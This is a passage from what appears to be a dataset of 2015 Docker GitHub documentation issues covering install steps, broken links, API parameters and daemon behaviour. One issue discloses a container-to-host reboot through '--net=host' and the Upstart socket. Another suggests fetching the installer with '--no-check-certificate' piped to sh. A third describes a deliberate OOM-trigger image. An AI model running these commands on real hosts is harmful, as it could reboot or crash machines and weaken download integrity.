3.19.0-26-generic #28-Ubuntu SMP Tue Aug 11 14:16:32 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux`\n\n```\nClient:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   d12ea79\n Built:        Thu Aug 13 02:40:42 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   d12ea79\n Built:        Thu Aug 13 02:40:42 UTC 2015\n OS/Arch:      linux/amd64\n```\n\n```\nContainers: 30\nImages: 112\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 172\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.19.0-26-generic\nOperating System: Ubuntu 15.04\nCPUs: 4\nTotal Memory: 11.62 GiB\nName: mg-mesos\nID: 7AES:SDZ5:WNYM:NM33:3FKF:SQK6:KYMM:DBXJ:DLGK:MN6L:WYRR:EFTI\nUsername: mgummelt\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\n```\n"},{"labels":[null,"documentation"],"text":"It would be useful to have a list of error codes and their corresponding cause. This could be in a tabular format such as:\n\n| Error Code | Meaning |\n| --- | --- |\n| NNN | Text |\n| NNN | Text |\n"},{"labels":["documentation",null],"text":"We currently have https://get.docker.com to get users up and running in \"no\" time, so that they can play around with Docker. Let's call it \"express install\".\n\nFor Linux, this is https://get.docker.com, for Windows and Mac users, we have Docker Toolbox, which (to me) fall in the same category; get users started quickly.\n\nHowever, the \"express install\" is in many cases _not_ suitable for production; we make many assumptions, and some settings we use are just to \"get it working\", but require manual configuration to be really useful (for example, the default device mapper configuration is not suitable for production).\n\nWe should point users to an \"advanced install\" section in the documentation, and _warn_ users that the \"express install\" should be reviewed before using in production.\n\nThe advanced install section in the documentation, should cover (or link to) - this is not a full list, just some initial thoughts;\n- Checking prerequisites (e.g., using `/contrib/check-config.sh`)\n- Pinning to a specific version of Docker\n- Picking, setting up, and configuring a graph driver (e.g. Setting up aufs)\n- Configuring daemon options (SysVinit, SystemD)\n- Picking, and configuring a default logging-driver\n- Securing Docker (Certificates, AppArmor, SeLinux)\n- Networking options and related (e.g. Certificates, Userland Proxy, FireWall issues)\n\nTL;DR; we should make it as easy as possible for people to get to \"play\" with Docker, but equally (if not more) important, we should explain that Docker uses advanced techniques; making optimum use of Docker _does_ require careful planning and configuration, and making informed decisions (e.g. The best graph driver for your situation). \n"},{"labels":["documentation"],"text":"In https://docs.docker.com/project/set-up-dev-env/ (Start a container and run a test, part 8)\n\nThe command line example has been updated to use `daemon` rather than `-d`:\n\n> `root@5f8630b873fe:/go/src/github.com/docker/docker#  docker daemon -D`\n\nBut the following explanation still refers to `-dD`, which was previously there\n\n> The -dD flag starts the daemon in debug mode. You’ll find this useful when debugging your code.\n"},{"labels":["documentation",null,null],"text":"The options for the `-v` flag on `docker run` seem to be lacking.\nSpecifically they only mention `rw` and `ro` as valid flags mean while there are also `z` and `Z`, which can be used independently or concatenated as such: `rw,Z`\n"},{"labels":["documentation"],"text":"I believe https://github.com/docker/docker/pull/14242 introduced a regression where if you run a container with an external volume, and then kill the docker daemon, any following usage of the volume results in system errors.\n\nIt looks like the volume name is recognized, but it does not try and mount the volume.\n\n```\n./docker -d --storage-driver=vfs &\n./docker run -ti --volume-driver=rexray -v testa15:/test busybox\nkill pid\n```\n\n```\n./docker -d --storage-driver=vfs &\n./docker run -ti --volume-driver=rexray -v testa15:/test busybox\nINFO[0003] POST /v1.21/containers/create                \nINFO[0003] POST /v1.21/containers/deb4b572c3fa950d16279d0e5485c7322e2b865f5f0d666a94a561f4140dfb4c/attach?stderr=1&stdin=1&stdout=1&stream=1 \nINFO[0003] POST /v1.21/containers/deb4b572c3fa950d16279d0e5485c7322e2b865f5f0d666a94a561f4140dfb4c/start \nTimestamp: 2015-08-27 07:18:29.736025403 +0000 UTC\nCode: System error\n\nMessage: stat /var/lib/docker/volumes/testa15/_data: no such file or directory\n\nFrames:\n\n---\n0: setupRootfs\nPackage: github.com/opencontainers/runc/libcontainer\nFile: rootfs_linux.go@37\n\n```\n\n```\n[root@mdm2 centos]# ./docker version\nINFO[0457] GET /v1.21/version                           \nClient:\n Version:      1.9.0-dev\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   44ea7e9\n Built:        Thu Aug 27 07:14:12 UTC 2015\n OS/Arch:      linux/amd64\n```\n"},{"labels":["documentation",null,null],"text":"The build and run commands both have long sections of examples.  In run them come in the middle of the page in build they come at the end.\n- Standardize examples at the end of every page\n- Design a consistent structure for calling out \"categories of examples\" in these larger sections\n\nhttp://docs.docker.com/reference/commandline/build/\nhttp://docs.docker.com/reference/commandline/run/\n"},{"labels":["documentation",null],"text":"Hi,\n\nI have a graph driver related question.\n\nSuppose one wants to design and implement a graph driver for some new file system, what would be the general rule to do so? I mean, one can look into existing graph drivers (e.g., btrfs, aufs, zfs, vfs, devmapper, etc) to figure out interfaces and data structures for the new file system driver, but is there any driver specification doc available somewhere? It will make it easier to design new file system driver for docker.\n\nAny suggestions/comments would be helpful! Thanks.\n\nBest,\n"},{"labels":["documentation"],"text":"The Docker engine install steps on Ubuntu include a step to install linux-image-(uname -r), followed by a step to reboot the system.  (see: https://github.com/docker/docker/blob/master/docs/installation/ubuntulinux.md)\n\nHowever, the Docker install script (https://github.com/docker/docker/blob/master/hack/install.sh) automatically performs this step.\n\nCan we remove the instructions to manually install linux-image-\\* and to reboot?\n"},{"labels":["documentation"],"text":"The [Content trust in Docker](https://docs.docker.com/security/trust/content_trust/) docs state (my emphasis on creating):\n\n> Make sure you read [Manage keys for content trust](https://docs.docker.com/security/trust/trust_key_mng) information for details on **creating**, securing, and backing up your keys.\n\nBut there's nothing about creating keys on the [Manage keys for content trust](https://docs.docker.com/security/trust/trust_key_mng) page because they're actually created on the first push as per:\n\n> When you push your first tagged image with content trust enabled, the docker client recognizes this is your first push and:\n> - alerts you that it will create a new offline key\n> - requests a passphrase for the key\n> - generates an offline key in the ~/.docker/trust directory\n> - generates a tagging key for in the ~/.docker/trust directory\n\nIt would be beneficial if the key creation process was explained outside of the **Push trusted content** section.\n\nDocumentation issue - so not copying in version/info etc.\n"},{"labels":["documentation",null],"text":"There's a lot of work to do here :)\n"},{"labels":["documentation"],"text":"- Current installation docs for Toolbox don't show how to upgrade a vm\n- Should show after version information how to upgrade VM as opposed to install/upgrade Toolbox\n"},{"labels":["documentation"],"text":"Or at least give a kind doc. \nSolution in #9697 seems not quite working now.\nFeel free to close it if there is a dup. Yet i didn't find one.\n"},{"labels":["documentation"],"text":"Hi,\n\nThere is a mistake in documentation for windows installation, in the part to connect with putty (Login with PUTTY instead of using the CMD).\n\nWith DockerToolbox, RSA keys was not generated in **%USERPROFILE%.ssh\\id_boot2docker** but in **%USERPROFILE%.docker\\machine\\machines<nameOfYourMachin\\**\n\nThe file to be modify :\ndocker/docs/installation/windows.md\n\nThanks :)\n"},{"labels":["documentation",null],"text":"Found a dead link in logging run reference: docs.docker.com/reference/run/…\n"},{"labels":["documentation",null],"text":"- Replace any links to the files in /terms with links to reference/glossary.md\n- Remove the /terms directory\n"},{"labels":["documentation",null],"text":"Earlier a missing page(404) redirected to the homepage, now it shows the following error : \n\n![image](https://cloud.githubusercontent.com/assets/796949/9212494/2ae7cc8e-403e-11e5-811d-6c4a4d7846e5.png)\n"},{"labels":["documentation"],"text":"The CentOS installation instructions at https://docs.docker.com/docker/installation/centos/ (`docs/installation/centos.md`) suggest that after installing the package one should:\n\n```\n4. Start the Docker daemon.\n\n                $ sudo service docker start\n```\n\n`service` is a thin layer on top of systemctl on CentOS.  And starting a systemctl service is only half the job.  After a reboot, the service will be stopped again.  To make it run on every boot, it needs to be \"enabled\" as well:\n\n```\n    sudo systemctl enable docker\n    sudo systemctl start docker\n```\n"},{"labels":["documentation"],"text":"It's not clear from any documentation that I can find whether `docker run --rm` is equivalent to doing a `docker rm -v` on the created container. Caveat: I usually can't find the mustard in the fridge because I'm looking everywhere _except_ right in front of me.\n"},{"labels":["documentation",null,null],"text":"Someone came to me trying to understand how `--publish` worked, confused that `--publish 1234` wasn't publishing `1234` on the host. They had come from the builder `EXPOSE` documentation and had left confused.\r\n\r\n[This link is broken in the builder documentation is broken](https://github.com/docker/docker/blame/f3af9c8bdb68e5db7aaed7aec11aa2a78fd7e546/docs/reference/builder.md#L457).\r\n\r\nOr at least, it doesn't go where I think was intended. In addition, [the `docker run`](https://docs.docker.com/engine/reference/run/#expose-incoming-ports) documentation doesn't mention the long form of `-p` (`--publish`) at all. \r\n\r\nIf someone is new to docker trying to understand how port publishing works, the `EXPOSE` section in the `docker run` documentation is not as up front as it could be about how to control the host port. (likewise with the `EXPOSE` in the builder docs).\r\n\r\nI would have submitted a fix to just point the link to `/reference/run/#expose-incoming-ports` but then I realised that it wouldn't really fix the problem of explaining what `-p` is, and that this would mean repeating the same link many times, which I don't think would have made for very good documentation.\r\n\r\nSo I thought I would punt the problem to the documentation experts here - sorry! :)\r\n\r\n/cc @SvenDowideit\r\n"},{"labels":["documentation"],"text":"In particular, the CLI lacks a full description and syntax.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/reference/api/docker_remote_api/\n\nThere is a state diagram under \"Docker Events\" and it looks okay on a large screen. However, on smaller screens (such as laptops), due to the page flow, the diagram can become too small to read.\n\nWould be nice from a UX perspective if there was a way to zoom-in / maximize the picture when clicked. :relaxed:\n"},{"labels":["documentation"],"text":"Docker labels are included in the json output for /containers/json (probably since docker 1.6), but there is no mention of this in the API. Please add/describe these expected fields.\n\nLink for reference: https://docs.docker.com/reference/api/docker_remote_api_v1.19/#list-containers\n"},{"labels":["documentation"],"text":"For openSUSE Tumbleweed there is a wrong path to 'Routing' menu in docker installation docs.  \nHere is the link: https://docs.docker.com/installation/SUSE/\n\n> \"If you want your containers to be able to access the external network you must enable the net.ipv4.ip_forward rule. This can be done using YaST by browsing to the Network Devices -> Network Settings -> Routing menu and ensuring that the Enable IPv4 Forwarding box is checked.\" \n\nIt's true for openSUSE 12.3, 13.1, 13.2 and also for SLES12, but for openSUSE Tumbleweed there is no 'Network devices' menu in YaST and 'Network settings' menu in 'System' menu of YaST. \nSo I believe that we need to add that information into docs. \n"},{"labels":["documentation"],"text":"Now we can do `docker rm $(docker ps -aq)` and ignore the errors if a container is running.\n\nBut it doesn't seem like a good solution.\n\nCould `docker rm --stopped` be a solution?\n\nAfter a lot of builds via Dockerfiles, many stopped, only used once containers are left in the system and takes up much space.\n\nThanks for looking into this.\n"},{"labels":["documentation"],"text":"Hi, would it be possible to display a page-title in the docs? When browsing the documentation with multiple tabs it is hard to distinguish which tab has which section open:\n\n![screen shot 2015-07-30 at 10 03 16](https://cloud.githubusercontent.com/assets/23406/8978403/3e8e8b74-36a2-11e5-8bb4-aca98146513e.png)\n"},{"labels":["documentation",null],"text":"The docs for 'docker run' should explain the `security-opts` flag.\n"},{"labels":["documentation",null],"text":"Hello,\n\nI have an hard time figuring out how to get the real remote ip of a client connecting to a (web) service inside a container which port is exposed to a port on the host.\n\nSo far the solution seems to be either one of:\n- use `--net=host`\n- disable the userland proxy\n- configure nginx on the host to forward the real ip address?\n\nHere are related issues:\n\nhttps://github.com/docker/docker/issues/7540\nhttps://github.com/jwilder/nginx-proxy/issues/130\nhttps://github.com/jwilder/nginx-proxy/issues/133\n\nNone of the current solutions seems to be \"right\" and they all seem temporary. Can you clarify/explain how things _should_ be, even if that means that the current docker 1.7.1 is bugged in that regard and that we have to use hack X or Y until things are fixed in 1.8.0.\n"},{"labels":["documentation",null],"text":"[Docs for API v1.19](https://docs.docker.com/reference/api/docker_remote_api_v1.19/#create-an-image) states that it is possible to specify `registry` query parameter:\n\n```\nQuery Parameters:\n    ...\n    registry – The registry to pull from.\n    ...\n```\n\nI'm trying to do so, but it's ignores registry parameter:\n\n```\n$ curl -v -XPOST --unix-socket /var/run/docker.sock \"http:/images/create?fromImage=bronislav/clsi-sharelatex:latest&registry=quay.io\"\n*   Trying /var/run/docker.sock...\n* Connected to http (/var/run/docker.sock) port 80 (#0)\n> POST /images/create?fromImage=bronislav/clsi-sharelatex:latest&registry=quay.io HTTP/1.1\n> Host: http\n> User-Agent: curl/7.42.1\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Date: Tue, 28 Jul 2015 14:22:51 GMT\n< Transfer-Encoding: chunked\n<\n{\"status\":\"Pulling repository bronislav/clsi-sharelatex\"}\n{\"errorDetail\":{\"message\":\"Error: image bronislav/clsi-sharelatex:latest not found\"},\"error\":\"Error: image bronislav/clsi-sharelatex:latest not found\"}\n* Connection #0 to host http left intact\n```\n\nIf I move registry parameter to the image path than docker started to pull image:\n\n```\ncurl -v -XPOST --unix-socket /var/run/docker.sock \"http:/images/create?fromImage=quay.io/bronislav/clsi-sharelatex:latest\"\n*   Trying /var/run/docker.sock...\n* Connected to http (/var/run/docker.sock) port 80 (#0)\n> POST /images/create?fromImage=quay.io/bronislav/clsi-sharelatex:latest HTTP/1.1\n> Host: http\n> User-Agent: curl/7.42.1\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Date: Tue, 28 Jul 2015 14:48:16 GMT\n< Transfer-Encoding: chunked\n<\n{\"status\":\"Pulling repository quay.io/bronislav/clsi-sharelatex\"}\n...\n{\"status\":\"Status: Image is up to date for quay.io/bronislav/clsi-sharelatex:latest\"}\n* Connection #0 to host http left intact\n```\n\nMy environment:\n\n```\n$ docker version\nClient version: 1.7.1\nClient API version: 1.19\nGo version (client): go1.4.2\nGit commit (client): 786b29d-dirty\nOS/Arch (client): linux/amd64\nServer version: 1.7.1\nServer API version: 1.19\nGo version (server): go1.4.2\nGit commit (server): 786b29d-dirty\nOS/Arch (server): linux/amd64\n```\n\n```\n$ docker info\nContainers: 2\nImages: 27\nStorage Driver: overlay\n Backing Filesystem: extfs\nExecution Driver: native-0.2\nLogging Driver: journald\nKernel Version: 4.0.9-coreos\nOperating System: CoreOS 752.1.0\nCPUs: 2\nTotal Memory: 7.341 GiB\nName: ip-10-5-3-181.empire\nID: 7APU:UBUI:7WEM:X5DL:BY7B:MQM6:4IAX:VZUN:2GZ4:LV7I:7PWI:42UC\n```\n\n```\n$ uname -a\nLinux ip-10-5-3-181.empire 4.0.9-coreos #2 SMP Thu Jul 23 20:22:11 UTC 2015 x86_64 Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz GenuineIntel GNU/Linux\n```\n\nFurther investigation shows that this parameter simply ignored in the request handler. It's only takes in account `fromImage`, `repo` and `tag` parameters: [api/server/server.go#L729-L733](https://github.com/docker/docker/blob/master/api/server/server.go#L729-L733).\n"},{"labels":["documentation",null],"text":"In the Installation step 3.\n\n![image](https://cloud.githubusercontent.com/assets/1347209/8911222/e878495a-343f-11e5-8bbd-4109eb00cb37.png)\n"},{"labels":["documentation"],"text":"Under \"Creating a Dockerfile\", the last line is missing an indent\nhttps://docs.docker.com/docker-trusted-registry/quick-start/#creating-a-dockerfile\n\n```\n FROM jenkins\n\n #New plugins must be placed in the plugins file\n COPY plugins /usr/share/jenkins/plugins\n\n #The plugins.sh script will install new plugins\n RUN /usr/local/bin/plugins.sh /usr/share/jenkins/plugins\n\n #Copy private key and cert to image\n COPY https.pem /var/lib/jenkins/cert\n COPY https.key /var/lib/jenkins/pk\n\n #Configure HTTP off and HTTPS on, using port 1973\nENV JENKINS_OPTS --httpPort=-1 --httpsPort=1973 --httpsCertificate=/var/lib/jenkins/cert --httpsPrivateKey=/var/lib/jenkins/pk\n```\n\nIf someone can point out where the file is, I can fix.\n"},{"labels":["documentation",null],"text":"The FAQ on docs.docker.com has broken links. Need to fix them.\n"},{"labels":["documentation"],"text":"In your tutorial documentation on https://docs.docker.com/mac/step_four/ you have in steap 1.5:\n\nCMD /usr/games/fortunes -a | cowsay\n\nand then on step 2.2:\n\nCMD /usr/games/fortune -a | cowsay # Singular fortune\n\nThe 2nd example is correct.\n"},{"labels":["documentation"],"text":"Description of problem: The `docker run --user` documentation states:\n\n> The default user within a container is root (id = 0), but if the developer created additional users, \n> those are accessible too. \n\nThis is misleading, as it is possible to just pass an arbitrary uid:gid to `-u` and run using that. As stackoverflow is also full of suggestions to use `groupadd && useradd && sudo -u` tricks to achieve the same effect, it seems like many people fall for this.\n\n`docker version`: N/A, but https://docs.docker.com/reference/run/#user as of 2015-07-21 11:22 UTC shows this issue.\n\n`docker info`: N/A\n\n`uname -a`: N/A\n\nEnvironment details (AWS, VirtualBox, physical, etc.): Docker website\n\nHow reproducible: 100%\n\nSteps to Reproduce:\n1. Point browser at https://docs.docker.com/reference/run/#user\n2. Read misleading documentation\n3. Compare with what happens on `docker run debian:jessie /usr/bin/id 1000; docker run -u 1000 debian:jessie /usr/bin/id`\n\nActual Results:\n\n```\n/usr/bin/id: 1000: no such user\nuid=1000 gid=0(root) groups=0(root)\n```\n\nExpected Results:\n\n```\n/usr/bin/id: 1000: no such user\n# something blows up because no user with uid 1000 exists\n```\n\nAdditional info:\nThe actual behaviour is much more useful than what the documentation describes. The documentation should be updated accordingly.\n"},{"labels":["documentation",null,null],"text":"Upstart, Ubuntu's init replacement, listens on an \"abstract socket pathname\" AF_UNIX socket for commands.\n\n```\ndbus/upstart.h\n79:#  define DBUS_ADDRESS_UPSTART \"unix:abstract=/com/ubuntu/upstart\"\n```\n\nNormally, you'd expect AF_UNIX class sockets to be governed by filesystem isolation, same as a `chroot`.  However the \"abstract\" names seem to escape this restriction and instead use the networking restriction.  [This is documented as a way to bypass chroot security, for example](http://blog.eduardofleury.com/archives/2007/09/13)  This means that disabling network isolation gives a container effectively full control of your host, no matter what other restrictions you may place on it:\n\n```\nroot@mesos-slave9-qa-uswest2:~# docker run --net=host ubuntu reboot\nubuntu:latest: The image you are pulling has been verified. Important: image verification is a tech preview feature and should not be relied on to provide security.\nStatus: Downloaded newer image for ubuntu:latest\nFATA[0009] Error response from daemon: engine is shutdown\nroot@mesos-slave9-qa-uswest2:~# Connection to mesos-slave9-qa-uswest2.qasql.opentable.com closed by remote host.\nConnection to mesos-slave9-qa-uswest2.qasql.opentable.com closed.\n```\n\nWhile this may be \"working as designed\" from a kernel isolation standpoint, this is an extremely unintuitive behavior for end users and quite possibly a huge security problem.  In particular that within the class AF_UNIX there are some sockets which are governed by network isolation (those beginning with a magical '\\0') and some by filesystem isolation (the rest).  Some combination of the following may help:\n- [Upstart should not use confusing abstract sockets, but prefer filesystem sockets](https://bugs.launchpad.net/upstart/+bug/1476353)\n- Docker should control isolation of AF_UNIX class sockets separately from AF_INET and others (i.e. I want to share my host's network stack without allowing side channels to init)\n- A specific security rule blocking access to the `com/ubuntu/upstart` socket in particular.  Somewhat ugly, but maybe practical.\n\n```\nroot@mesos-slave6-qa-uswest2:~# docker version\nClient version: 1.6.2\nClient API version: 1.18\nGo version (client): go1.4.2\nGit commit (client): 7c8fca2\nOS/Arch (client): linux/amd64\nServer version: 1.6.2\nServer API version: 1.18\nGo version (server): go1.4.2\nGit commit (server): 7c8fca2\nOS/Arch (server): linux/amd64\nContainers: 8\nImages: 62\nStorage Driver: overlay\n Backing Filesystem: extfs\nExecution Driver: native-0.2\nKernel Version: 4.0.4\nOperating System: Ubuntu 14.04.2 LTS\nCPUs: 8\nTotal Memory: 29.45 GiB\nName: mesos-slave6-qa-uswest2\nID: DQ77:L5SM:2ZH6:NHRP:D72D:SIFN:XJDS:7H7Y:MHRR:UX4Y:HTWK:UVB6\n```\n"},{"labels":["documentation"],"text":"Found a few problems with this section:\nhttps://docs.docker.com/reference/builder/#environment-replacement\n\n> Note: prior to 1.3, Dockerfile environment variables were handled similarly, in that they would be replaced as described below. However, there was no formal definition on as to which instructions handled environment replacement at the time. After 1.3 this behavior will be preserved and canonical.\n> \n> ... there was no formal definition on as to which instructions handled environment replacement at the time\n> 1. This sentence doesn't make sense.\n\nDockerfile environment variables were handled similarly\n2. Similarly to what? Perhaps the note block should be moved after the explanation of Environment variable.\n\nPerhaps someone could review the Environment variable section and reorganize the material presented.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/installation/ubuntulinux/\n\nUnder Installation, step 3, there are odd > characters in the paragraph:\n![screen shot 2015-07-18 at 6 39 52 am](https://cloud.githubusercontent.com/assets/679475/8761787/fae2db20-2d17-11e5-91b6-f9781c99b372.png)\n\nI think the > is used as quote in GitHub's markdown and does not render properly on the docs site.\nhttps://github.com/docker/docker/blob/master/docs/installation/ubuntulinux.md\n"},{"labels":["documentation"],"text":"The basic docs for swarm use `docker run swarm`, keeping it clear that the binary is in a container. The \"discovery\" section refers to `swarm` as a binary. The [swarm docs on GitHub](https://github.com/docker/swarm) show how to build the `swarm` binary, but this is not mentioned in docs.docker.com\n\nPlease pick one method and use that for all documentation or otherwise make it clear how to execute the commands.\n"},{"labels":["documentation"],"text":"Need to point to the reference/logging page from the logs.md page as per comments on this PR: https://github.com/docker/docker/pull/11485/files#diff-bf81424845bcab2902c9809e30dfe6e0\n\nAlso should update the page to point that other drivers have other options\n"},{"labels":[null,"documentation",null],"text":"As discussed in https://github.com/docker/docker/pull/13375#issuecomment-120170880, the [Docker Hub and Registry V1](https://github.com/docker/docker/blob/master/docs/reference/api/hub_registry_spec.md) API reference needs to be deprecated or rewritten.\n\nAdding this issue as a reminder, but there might be an overlap here with the distribution docs, so not sure what the best approach is here.\n\nAlso, technical guidance is needed here (https://github.com/docker/docker/pull/13375#issuecomment-120173326)\n\n/cc @moxiegirl @tiborvass @stevvooe \n"},{"labels":["documentation"],"text":"The recommanded installation procedure on Linux with `wget` is failing:\n\n```\nwget -qO- https://get.docker.com/ | sh\n```\n\nreturns no error (exit 0) but nothing happen either.\n\nTrying a simple `wget https://get.docker.com` reveals an SSL certificate verification issue:\n\n```\n--2015-07-15 10:44:50--  https://get.docker.com/\nResolving get.docker.com (get.docker.com)... 52.0.250.56, 52.6.66.251, 54.210.203.88\nConnecting to get.docker.com (get.docker.com)|52.0.250.56|:443... connected.\nERROR: cannot verify get.docker.com's certificate, issued by `/C=US/O=GeoTrust Inc./CN=RapidSSL SHA256 CA - G3':\n  Unable to locally verify the issuer's authority.\nTo connect to get.docker.com insecurely, use `--no-check-certificate'.\n```\n\nSo, unfortunately, passing the `--no-check-certificate` option to grab the script is the only way to go at the moment.\n"},{"labels":["documentation",null],"text":"User reports:\n\nhttps://docs.docker.com/articles/dockerfile_best-practices/#run-only-one-process-per-container implies that process=application=service which IMO may not be always true, WDYT?\n\n\"In almost all cases, you should only run a single process in a single container. Decoupling applications into multiple containers makes it much easier to scale horizontally and reuse containers. If that service depends on another service, make use of container linking.\"\n"},{"labels":["documentation",null],"text":"I thought they were already removed, we have talked about this in the past (can't remember who it was), and I thought we agreed we would remove the API docs, or at least mark as deprecated, so it wouldn't cause confusion.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/articles/dockerfile_best-practices/\n\nI read the following suggestion a number of times and I don't quite understand what it means?\n\n> Don’t do RUN apt-get update on a single line. This will cause caching issues if the referenced archive gets updated, which will make your subsequent apt-get install fail without comment.\n1. Is it referring to Docker cache or apt cache?\n2. What referenced archive is it referring to?\n\nIt would be nice if this first bullet can be improved. For example, the information the 2nd bullet is clear.\n\nAlso, it is important to clarify the documentation because other people may be using yum package manager and needs to understand the mechanics of the RUN command to follow the best practices.\n"},{"labels":["documentation"],"text":"This issue transfer of https://github.com/docker/docs-base/issues/102\n\nFor me, it seems this link:\n\nhttp://docs.docker.com/installation/mac/\n\ndoesn't fully work.  When using nginx, the SSL ports are not working (can't curl, telnet, etc.)\n\nAlso, some of the commands like under section \"Mount a volume on the container\" step 5 don't show any wrapping, so unless you know to look, you miss part of the command.  Aka, I only see:\n\ndocker run -d -P -v $HOME/site:/usr/share/nginx/html --name\n\nWhen you should see\n\ndocker run -d -P -v $HOME/site:/usr/share/nginx/html --name mysite nginx\n\nClearly that could be a css browser issue, but in my latest Chrome, there is no eye candy to show the command goes long.\n\nRegards.\n\nRon \n"},{"labels":["documentation"],"text":"Version, Os, and KernelVersion are being returned even for `/v1.17/version` calls.\n\nRef: https://bugzilla.redhat.com/show_bug.cgi?id=1241699\n"},{"labels":["documentation",null],"text":"Hi,\n\nI spun up two Ubuntu 14.04 VMs in AWS, and on each, upgraded to the 3.18 kernel, installed docker, did a git clone https://github.com/docker/docker.git; followed by a make DOCKER_EXPERIMENTAL=1 . I then created a soft link to docker/bundles/1.8.0-dev/binary/docker-1.8.0-dev at /usr/bin/docker, effectively replacing the older docker that was installed.\n\nThen, I followed the instructions at https://github.com/docker/libnetwork/blob/master/docs/overlay.md, copy-pasting each instruction and replacing the IPs as applicable. Consul came up, docker daemons came up well on each node, and I was able to create services, networks, attach containers to services, etc, as described in the document.\n\nThe problem I'm seeing is that while pings between containers on the same host work fine, I'm not able to ping one container from another across the two hosts. \n\nAny idea why this doesn't work? I'll be testing libnetwork on my vagrant setup in a short while, and will update the bug with those results.\n\nThanks,\nRegards,\nVijay\n"},{"labels":["documentation"],"text":"Hello,\n\nOn this page: http://docs.docker.com/installation/mac/\n\nUnder this heading: \"From your command line\"\n\nStep 3: Display the environment variables for the Docker client.\n\nIt says to run 'boot2docker shellinit' to display your environment variables for the Docker client. It does not.\n\n> boot2docker shellinit \n> Writing /Users/rpetty/.boot2docker/certs/boot2docker-vm/ca.pem \n> Writing /Users/rpetty/.boot2docker/certs/boot2docker-vm/cert.pem \n> Writing /Users/rpetty/.boot2docker/certs/boot2docker-vm/key.pem \n> Your environment variables are already set correctly.\n\nThis might only be on fresh installs. I tried running boot2docker via the Mac 'applications', then I tried as the instructions say to start via the cli. In either case, it did not show the environment variables. If its only during the vary first time (like during initial set up, then maybe mention that.) Could be something else, not sure yet.\n\nRegards.\n\nRon\n"},{"labels":["documentation"],"text":"https://docs.docker.com/userguide/dockervolumes/\n\nUnder \"Adding a data volume\" you create a volume.  You then go to confirm it via the next section \"Locating a volume\".  When I run 'docker inspect web', I see similar output but not exact.  I see the following:\n\n```\n...\n    \"Volumes\": {\n        \"/webapp\": \"/mnt/sda1/var/lib/docker/volumes/d2c56f0880cb121190e0d5b50c98c57d241109f37139d995da55883b7955427b/_data\"\n    },\n    \"VolumesRW\": {\n        \"/webapp\": true\n    },\n...\n\"Volumes\": {\n            \"/webapp\": {}\n        },\n...\n```\n\nMight want to clarify when you scroll up to see results the first 'Volumes' is not the one showing in the article, you need to scroll further up to see the detailed ones.  The empty Volumes is under the 'Config' block.  I am not sure what it is or represents.  Might just want to add a warning about seeing that or explain what it is.\n\nRegards.\n\nRon\n"},{"labels":["documentation",null],"text":"Using the `docker.service` from here and creating a drop-in  `/etc/systemd/system/docker.service.d/override.conf` to tweak command line parameters (as documented at https://docs.docker.com/articles/systemd/)\n\n```\n[Service]                                                                                                                       \nExecStart=/usr/bin/docker -d -H fd:// --bip=172.17.42.1/16  \n```\n\nends up with systemd refusing to start the daemon:\n\n```\ndocker.service has more than one ExecStart= setting, which is only allowed for Type=oneshot services. Refusing. \n```\n\nWhat is the recommended way to tweak the daemon command-line?\n"},{"labels":["documentation"],"text":"The guide here on the docker documentation (https://docs.docker.com/articles/b2d_volume_resize/) suggests using the gparted livecd iso, however, the current version does not work. Others have experienced this problem too, see: https://gist.github.com/joost/a7cfa7b741d9d39c1307\n\nVersion of gparted livecd: gparted-live-0.22.0-2-i586.iso\nVersion of boot2docker:\nBoot2Docker-cli version: v1.6.0\nGit commit: 9894ae9\n"},{"labels":["documentation"],"text":"Please provide documentation on how to properly create a bind between the container and the host machine. \n"},{"labels":["documentation",null,null,null],"text":"While it's no secret I've been hugely against this feature since back when it was just a proposal/PR (#12528/#11034), upon further investigation, it seems that the feature was implemented without much understanding, as proven by the fact that it doesn't even work :-)\n\nOk, so first subject, it doesn't work (docker 1.7.0):\nI don't know where docker thinks it's setting the cgroup parameter to disable the oom killer, but it's not on the cgroup used by the container.\n\n```\n# docker run -i --privileged --oom-kill-disable fedora:20 bash <<'EOF' \nmount -n -t tmpfs -o uid=0,gid=0,mode=0755 cgroup /sys/fs/cgroup\nmkdir /sys/fs/cgroup/memory\nmount -n -t cgroup -o memory cgroup /sys/fs/cgroup/memory\nmemcgpath=\"/sys/fs/cgroup/memory/$(awk -F: '$2 == \"memory\" { print $3 }' < /proc/1/cgroup)\"\necho \"memcgpath=$memcgpath\"\ncat $memcgpath/memory.oom_control\nEOF\n\nmemcgpath=/sys/fs/cgroup/memory//system.slice/docker-dc1408974e62968ff7e73fe3206045a98a540a0f455d864677be5e9a47d76cc5.scope\noom_kill_disable 0\nunder_oom 0\n```\n\nSecondly, the cgroup oom_kill_disable setting only does anything if a cgroup memory limit is also in place. Currently nothing enforces or advises the oom-kill-disable option only be used in conjunction with a memory limit.\n\nThirdly, using this flag requires manual intervention if the container does hit an OOM condition. The flag does prevent the process from being killed, but the process hangs instead (goes into defunct state). This means manual intervention is required to either kill the process/container, or to increase the memory limits. If you want to increase the limits, you have to go mucking around in the cgroup filesystem. So realistically, the action to take here is to manually kill the container.\nTo compound this, the fact that the process has been sent defunct is not easily observable. From the perspective of someone using the docker client, the container is still running, the processes inside it are still there, they just stop responding.\n\n&nbsp;\n\nHere's a little test container I created for this: [phemmer/do-oom](https://registry.hub.docker.com/u/phemmer/do-oom/) ([github](http://github.com/phemmer/docker-do-oom))\nThe container runs a process which allocates 20gb of memory, and then tries to use that 20gb (which invokes OOM).\n**NOTE**: I do not advise running this container on a system which you care about. The OOM killer is very indiscriminate, and can kill anything. Also don't run it on a system with swap enabled, or the entire system will likely come grinding to a halt.\n\nThe first example, we run the container with oom killer (supposedly) disabled:\n\n```\n# docker run -ti --oom-kill-disable do-oom 